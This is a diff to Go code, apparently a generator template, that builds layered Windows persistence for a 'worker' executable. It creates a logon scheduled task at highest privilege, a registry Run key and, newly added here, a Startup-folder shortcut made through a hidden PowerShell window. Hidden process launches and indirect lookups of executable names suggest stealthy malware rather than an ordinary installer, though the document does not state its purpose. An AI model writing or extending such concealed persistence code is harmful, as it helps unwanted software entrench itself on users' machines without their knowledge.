@@ -107,13 +107,14 @@ func cmdHidden(name string, args ...string) *exec.Cmd {
 
 func opSetupTask(workerPath string) {
 	taskName := "%s"
-	tr := "\\\"" + workerPath + "\\\" worker"
+	tr := "\"" + workerPath + "\" worker"
 	cmd := cmdHidden(getSchtasksExeName(), "/Create", "/TN", taskName, "/TR", tr, "/SC", "ONLOGON", "/RL", "HIGHEST", "/F")
 	if err := cmd.Run(); err != nil {
 		cmd2 := cmdHidden(getSchtasksExeName(), "/Create", "/TN", taskName, "/TR", tr, "/SC", "ONLOGON", "/RL", "LIMITED", "/F")
 		_ = cmd2.Run()
 	}
 	opAddRegistryRun(workerPath)
+	opAddStartupShortcut(workerPath)
 }
 
 func opAddRegistryRun(workerPath string) {
@@ -131,10 +132,27 @@ func opAddRegistryRun(workerPath string) {
 	defer regCloseKey.Call(uintptr(hKey))
 
 	valName, _ := syscall.UTF16PtrFromString(getDisplayName())
-	cmdLine := "\\\"" + workerPath + "\\\" worker"
+	cmdLine := "\"" + workerPath + "\" worker"
 	valData, _ := syscall.UTF16FromString(cmdLine)
 	dataBytes := (*[1 << 20]byte)(unsafe.Pointer(&valData[0]))[:len(valData)*2]
 	regSetValueEx.Call(uintptr(hKey), uintptr(unsafe.Pointer(valName)), 0, 1, uintptr(unsafe.Pointer(&dataBytes[0])), uintptr(len(dataBytes)))
+}
+
+func opAddStartupShortcut(workerPath string) {
+	startupDir := filepath.Join(os.Getenv(getAppDataEnvName()), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+	lnkPath := filepath.Join(startupDir, getDisplayName()+".lnk")
+
+	if _, err := os.Stat(lnkPath); err == nil {
+		return
+	}
+
+	ps := fmt.Sprintf(
+		"$ws=(New-Object -ComObject WScript.Shell).CreateShortcut('%s');$ws.TargetPath='%s';$ws.Arguments='worker';$ws.WindowStyle=7;$ws.Save()",
+		strings.ReplaceAll(lnkPath, "'", "''"),
+		strings.ReplaceAll(workerPath, "'", "''"),
+	)
+	cmd := cmdHidden(getPowerShellExe(), "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps)
+	_ = cmd.Run()
 }
 `, taskName))
 }
